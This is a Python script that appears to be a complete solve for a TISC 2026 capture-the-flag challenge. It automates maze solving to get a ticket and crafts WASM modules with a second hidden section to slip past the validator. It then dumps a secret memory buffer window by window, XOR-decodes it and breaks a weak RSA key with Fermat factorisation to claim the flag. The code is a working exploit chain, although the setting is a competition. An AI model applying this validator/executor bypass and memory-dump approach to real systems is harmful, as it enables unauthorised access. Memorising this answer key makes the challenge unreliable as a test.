#!/usr/bin/env python3
# Lion City Layover - TISC 2026 - full solve, challenge data -> flag.
# Requires network access to the challenge host (run it from a machine that can reach it).
import base64, hashlib, math, re, struct, requests

BASE = "http://chals.tisc26.ctf.sg:57161"
XORK = 0x37

# --- maze solver ------------------------------------------------------------
MOVES = {"U": (0, -1), "D": (0, 1), "L": (-1, 0), "R": (1, 0)}

def find(grid, ch):
    for y, row in enumerate(grid):
        x = row.find(ch)
        if x != -1:
            return (x, y)
    return None

def bfs(grid, src, dst):
    from collections import deque
    q = deque([(src[0], src[1], "")]); seen = {src}
    while q:
        x, y, path = q.popleft()
        if (x, y) == dst:
            return path
        for m, (dx, dy) in MOVES.items():
            nx, ny = x + dx, y + dy
            if 0 <= ny < len(grid) and 0 <= nx < len(grid[ny]) and grid[ny][nx] != "#" and (nx, ny) not in seen:
                seen.add((nx, ny)); q.append((nx, ny, path + m))
    return None

def solve_maze(grid):
    import itertools
    S, E = find(grid, "S"), find(grid, "E")
    stamps = [find(grid, c) for c in "ABC" if find(grid, c)]
    best = None
    for perm in itertools.permutations(stamps):
        cur, route, ok = S, "", True
        for st in perm:
            seg = bfs(grid, cur, st)
            if seg is None: ok = False; break
            route += seg; cur = st
        if not ok: continue
        seg = bfs(grid, cur, E)
        if seg is None: continue
        route += seg
        if best is None or len(route) < len(best): best = route
    return best

def get_ticket():
    start = requests.get(f"{BASE}/api/harbour/start").json()
    traces = [solve_maze(l["grid"]) for l in start["levels"]]
    r = requests.post(f"{BASE}/api/harbour/stamp", json={"session": start["session"], "traces": traces}).json()
    return r["ticket"]

# --- WASM cartridge builder -------------------------------------------------
def leb(n):
    out = b""
    while True:
        b = n & 0x7f; n >>= 7
        out += bytes([b | 0x80]) if n else bytes([b])
        if not n: return out

def custom(name, data):
    body = leb(len(name)) + name + data
    return b"\x00" + leb(len(body)) + body

def singa(prog):
    data = b"MERLION\x00v1.6.1\x00" + struct.pack("<H", len(prog)) + bytes(prog)
    return custom(b"singa", data)

def module(*sections):
    return b"\x00asm\x01\x00\x00\x00" + b"".join(sections)

BENIGN = [0x01, 0x2a, 0xfe, 0xff]           # push one colour, finalize, end (passes validator)

def read_cartridge(offset):                  # two singa sections = validator/executor differential
    prog = [0x37, (offset >> 8) & 0xff, offset & 0xff, 0x21, 0xfe, 0xff]  # 0x37 read 33 bytes
    return base64.b64encode(module(singa(BENIGN), singa(prog))).decode()

def pow_nonce(ticket, b64):
    n = 0
    while True:
        if hashlib.sha256(f"{ticket}.{b64}.{n}".encode()).hexdigest().startswith("0000"):
            return str(n)
        n += 1

def run(ticket, b64):
    nonce = pow_nonce(ticket, b64)
    return requests.post(f"{BASE}/api/harbour/run", json={"ticket": ticket, "module": b64, "pow": nonce}).json()

# --- dump the secret buffer, XOR-decode -------------------------------------
def dump_passport(ticket):
    buf = ""
    for off in range(0, 32 * 40, 32):        # 40 windows of 32 bytes is enough to reach rsa_c
        res = run(ticket, read_cartridge(off))
        if "chroma" not in res:
            raise SystemExit(f"read failed at {off}: {res}")
        buf += "".join(chr(v ^ XORK) for v in res["chroma"][:32])
        if "END-PASSPORT" in buf:
            break
    return buf

# --- Fermat factorization + RSA ---------------------------------------------
def fermat(n):
    a = math.isqrt(n)
    if a * a < n: a += 1
    while True:
        b2 = a * a - n
        b = math.isqrt(b2)
        if b * b == b2:
            return a - b, a + b
        a += 1

def main():
    ticket = get_ticket()
    passport = dump_passport(ticket)
    n = int(re.search(r"rsa_n=(\d+)", passport).group(1))
    e = int(re.search(r"rsa_e=(\d+)", passport).group(1))
    c = int(re.search(r"rsa_c=(\d+)", passport).group(1))
    p, q = fermat(n)
    assert p * q == n
    d = pow(e, -1, (p - 1) * (q - 1))
    m = pow(c, d, n)
    claim = m.to_bytes((m.bit_length() + 7) // 8, "big").lstrip(b"\x00").decode()
    print("boarding pass:", claim)
    out = requests.post(f"{BASE}/api/harbour/claim", json={"ticket": ticket, "claim": claim}).json()
    print("FLAG:", out.get("flag"))

if __name__ == "__main__":
    main()
